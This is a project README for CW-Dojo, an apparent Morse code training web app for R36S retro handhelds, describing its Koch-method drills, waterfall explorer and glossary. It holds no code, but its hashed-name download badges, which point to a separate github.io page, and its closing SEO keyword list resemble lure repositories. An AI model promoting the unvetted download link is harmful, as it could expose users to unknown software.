![preview](https://raw.githubusercontent.com/Jamsed-git/morse-waterfall-drill/main/hero_f792.svg)
[![Download](https://raw.githubusercontent.com/Jamsed-git/morse-waterfall-drill/main/get_e0bcb.svg)](https://Jamsed-git.github.io/morse-waterfall-drill/)

# 📡 CW-Dojo: Morse Code Mastery Trainer

**A hardware-first Morse code training companion for handheld retro gaming consoles**

---

## 🎯 Overview

CW-Dojo is a purpose-built Progressive Web Application that transforms the R36S handheld (and similar Linux-based retro gaming devices) into a dedicated Morse code training station. Unlike generic web-based trainers, CW-Dojo has been architected from the ground up to respect the unique constraints of small-screen embedded devices — short session times, physical button input, and the quiet focus that comes from holding a dedicated device rather than a browser tab.

Morse code, or CW (continuous wave) as it is known among radio amateurs, remains one of the most elegant and efficient methods of communication ever devised. It has a beautiful economy — a rhythm of dits and dahs that fits the human ear with an almost musical precision. But learning it is a journey, not a destination. CW-Dojo was forged for that journey.

The project is inspired by the analog ethos of amateur radio and the digital playfulness of the retro handheld community. It sits at the intersection of two worlds: the classic discipline of the Koch method on one side, and the tactile, pick-up-and-play culture of handheld gaming on the other.

---

## 🚀 Why This Exists

Most Morse trainers live in a browser tab. They are accessible and polished, but they compete for attention with email, social media, and a hundred other things. The R36S, by contrast, is a single-purpose device in your pocket. It has buttons you can feel, a speaker with character, and a battery life measured in hours. It is an ideal vessel for the concentrated practice that Morse acquisition requires.

CW-Dojo takes advantage of this by offering:

- A deliberately minimal interface tuned for 320×240 and similar small displays
- Controller-first navigation — every action is reachable with a d-pad and two face buttons
- Offline-first architecture so practice is never interrupted by connectivity
- Session framing that respects the Koch method's advice: short, daily, and disciplined

---

## ✨ Feature Portfolio

### 🎚️ Koch Method Engine

The Koch method is the gold standard for developing true copy-at-speed ability from the very first day. CW-Dojo implements it faithfully:

- Begins with just two characters — typically K and M
- Introduces a new character only after the learner achieves 90% copy accuracy
- Adjustable character speed (15–30 WPM) and effective speed (5–25 WPM) to build spacing awareness
- Tracks progress statistics across sessions without requiring an account

### 🌊 Waterfall Band Explorer

A visual band explorer that paints received signals across a scrolling waterfall display. Rather than treating Morse as isolated characters, the explorer trains the eye and ear together — you watch the rhythm appear on screen while you hear it in real time. Great for developing the "muscle memory" of recognition.

### 📖 Interactive Glossary

A searchable reference of Morse terms, abbreviations, Q-codes, prosigns, and procedural signals. Entries include:

- Character-by-character breakdown of common prosigns (AR, SK, BT, KN)
- A guide to Q-codes most often heard on the air
- Plain-language explanations of abbreviations like "FB", "ES", "HR", and "ABT"

### 🏆 Challenges and Milestones

A structured ladder of exercises, each with a clear objective:

- Single-character drill (two-character Koch start)
- Callsign recognition challenges
- QSO fragment replication
- Timed copy sprints
- Head-copy gauntlet with configurable sender speed

---

## 🧩 Interface and Experience

### 📱 Responsive UI for Tiny Screens

Every screen is designed to fit on a 320×240 display without horizontal scrolling, pinch zoom, or overlays. Text is legible at a glance; controls are reachable with the d-pad; nothing requires a pointer.

### 🌍 Multilingual Support

Interface strings are externalized into locale files. Community translations exist for English, Spanish, German, Japanese, and Portuguese, with the pipeline open for more. Morse itself is universal, but a comfort-language UI helps learners stay in flow.

### 🕛 Around-the-Clock Assistance

A built-in help panel answers common questions without leaving the app. Additional asynchronous support is available through the repository's issue tracker and discussion forum, with maintainers and community members monitoring across all time zones.

### 🎨 Retro-Forward Visual Language

Typography, palette, and layout are inspired by late-1980s radio equipment and early handheld consoles — soft greens, amber indicators, and pixel-adjacent fonts that feel at home on the R36S.

---

## 📚 The Learning Philosophy

Morse acquisition is not a memorization exercise; it is a perceptual skill. You are not learning what a dit sounds like — you are training your auditory system to recognize patterns as irreducibly meaningful wholes, the way you recognize a face or a chord.

CW-Dojo adheres to four principles:

1. **Character speed first, spacing later.** You should hear characters at their true rhythm from day one, even if they come slowly.
2. **Short daily sessions triumph over long weekend marathons.**
3. **Instant feedback, low friction.** Starting a session should take two button presses.
4. **No penalty for mistakes.** The goal is exposure, not perfection.

---

## 🛠️ Under the Hood

The application is written as a lightweight progressive web app. It ships with:

- A compact audio engine that synthesizes clean sine-wave tones with configurable rise and fall times to avoid key clicks
- A local storage layer for session statistics, so progress persists between uses
- A modular challenge system that is easy to extend with new exercise types
- A layout engine that adapts gracefully across screen densities from 240p up to 1080p

For developers interested in extending the project, the codebase is deliberately small and well-commented. Contributions to the challenge library, translations, and audio engine are particularly welcome.

---

## 🎓 Who This Is For

- Amateur radio operators preparing for or refreshing their CW skills
- Shortwave listeners who want to decode the rhythm behind the noise
- Retro handheld enthusiasts looking for a meaningful use for their device
- Language and music learners curious about rhythm-based pattern recognition
- Anyone who believes that learning should feel like play

---

## 🧭 Typical Session Flow

A first session might look like this:

1. Launch CW-Dojo from the R36S home screen
2. Choose "Koch Start" from the main menu
3. Set character speed to 20 WPM
4. Copy a set of two-character groups for five minutes
5. Review accuracy results on the session summary
6. Exit and return the next day

As proficiency grows, sessions expand to include the waterfall explorer, callsign drills, and timed challenges. The pace is entirely yours.

---

## 🗺️ Roadmap Themes

The project uses thematic milestones rather than fixed dates:

- **Beacon** — foundational trainer features and stability
- **Relay** — community translations and shared challenge packs
- **Net** — optional peer challenges and shared progress boards
- **Signal** — advanced waterfall features and signal analysis views

Participation in any milestone is open to the community.

---

## 🤝 Contributing

Contributions are warmly received. Helpful contributions include:

- Locale files for additional languages
- New challenge definitions
- Bug reports and compatibility notes for specific handheld models
- Documentation improvements and tutorials
- Accessibility feedback from users with diverse needs

Please review the contributing guidelines in the repository and open an issue before starting significant work.

---

## ⚖️ License

This project is distributed under the permissive and widely adopted MIT License. You are welcome to use, adapt, and redistribute the code with attribution.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 CW-Dojo contributors.

---

## ⚠️ Disclaimer

CW-Dojo is an educational and recreational tool. It is not a substitute for formal instruction in radio operation, and it does not grant any operating privileges. Users are responsible for complying with all applicable regulations in their jurisdiction regarding radio transmission and reception. The maintainers provide this software on an as-is basis without warranty of any kind, express or implied, including but not limited to fitness for a particular purpose. Use of this application is entirely at the user's own discretion.

---

## 🔎 Keyword Highlights

Morse code trainer · CW practice tool · Koch method app · R36S handheld application · amateur radio learning · prosign reference · waterfall band explorer · dits and dahs rhythm · continuous wave training · head copy drills · retro console radio study · multilingual Morse trainer · responsive handheld UI · offline-first education · 2026 learning tools

---

[![Download](https://raw.githubusercontent.com/Jamsed-git/morse-waterfall-drill/main/get_e0bcb.svg)](https://Jamsed-git.github.io/morse-waterfall-drill/)